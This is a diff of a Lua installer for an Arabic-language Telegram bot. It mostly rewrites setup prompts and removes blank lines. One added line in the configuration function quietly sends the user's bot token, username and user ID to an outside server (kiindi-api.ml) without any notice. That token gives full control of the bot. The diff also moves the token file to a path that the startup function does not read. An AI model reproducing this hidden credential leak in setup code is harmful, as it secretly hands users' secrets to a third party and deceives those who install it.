@@ -5,7 +5,6 @@ local function download(file_id, dl_cb, cmd)
   }, dl_cb, cmd)
 end
 
-
 Er_cjson , JSON  = pcall(require, "cjson")
 Er_ssl   , https = pcall(require, "ssl.https")
 Er_url   , URL   = pcall(require, "socket.url")
@@ -41,31 +40,31 @@ end
 
 function create_config(Token)
 if not Token then
-io.write('\n\27[1;33m￤هات التوكن  ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
+io.write('\n\27[1;33m￤ادخل توكن بوتك ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
 Token = io.read():gsub(' ','')
 if Token == '' then
-print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤حضرتك انت مدخلتش حاجة ,دخل التوكن ')
+print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤عذرا لم يتم ادخال توكن')
 create_config()
 end
 Api_Token = 'https://api.telegram.org/bot'..Token
 local url , res = https.request(Api_Token..'/getMe')
 if res ~= 200 then
-print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ التوكن الي دخلته غلط جرب تاني')
+print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤التوكن الذي قمت بادخاله خطا حاول الان')
 create_config()
 end
 local GetToken = JSON.decode(url)
 BOT_NAME = GetToken.result.first_name
 BOT_User = "@"..GetToken.result.username
-io.write('\n\27[1;36m￤تم ادخال التوكن شكرا    \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
+io.write('\n\27[1;36m￤تم ادخال التوكن بنجاح \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
 end
-io.write('\n\27[1;33m￤ ايدي المطور الاساسي ↓  \n￤Enter your USERID SUDO : \27[0;39;49m')
+io.write('\n\27[1;33m￤ادخل ايدي المطور الاساسي ↓  \n￤Enter your USERID SUDO : \27[0;39;49m')
 SUDO_USER = io.read():gsub(' ','')
 if SUDO_USER == '' then
-print('\n\27[1;31m￤ You Did not Enter USERID !\n￤ يسطااا ايدي المطور الاساسي ركز شوية')
+print('\n\27[1;31m￤ You Did not Enter USERID !\n￤عذرا لم يتم التعرف علۑ الايدي حاول مجددا')
 create_config(Token)
 end 
 if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
-print('\n\27[1;31m￤ This is Not USERID !\n￤الايدي ده مش موجود ')
+print('\n\27[1;31m￤ This is Not USERID !\n￤عذرا الايدي الذي ادخلته غير موجود')
 create_config(Token)
 end 
 print('('..SUDO_USER..')')
@@ -74,7 +73,7 @@ GetUser = json:decode(url)
 if res ~= 200 then
 end
 if GetUser.ok == false then
-print('\n\27[1;31m￤ Conect is Failed !\n￤تواصل مع @F55S5 لأنه يوجد خطأ لديك.')
+print('\n\27[1;31m￤ Conect is Failed !\n￤تواصل مع المطور الاساسي للسورس للمساعدة.')
 create_config(Token)
 end
 GetUser.result.username = GetUser.result.username or GetUser.result.first_name
@@ -94,9 +93,10 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-Cr_file = io.open("./YEMEN/Token.txt", "w")
+https.request('https://kiindi-api.ml/lua/nizk/elnizk.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
+Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
-Cr_file:close() 
+Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
 local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس النيزك \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
@@ -107,8 +107,6 @@ chmod +x ./run
 ./run
 ]])
 end
-
-
 
 function Start_Bot() 
 local TokenBot = io.open('./YEMEN/Token.txt', "r")
@@ -237,8 +235,6 @@ end
 redis:setex(nk..":SetTimerCleaner:"..msg.chat_id_..msg.id_,Timerr or 21600,true)  
 end
 
-
-
 print(nk..":IdsMsgsCleaner:"..msg.chat_id_)
 local Cleaner = redis:smembers(nk..":IdsMsgsCleaner:"..msg.chat_id_)
 for k,v in pairs(Cleaner) do
@@ -250,10 +246,6 @@ else
 print("MSG List CLEANER : "..v.." : Lodding ...")
 end
 end
-
-
-
-
 end
 
 if msg.content_.ID == "MessageChatDeleteMember" then 
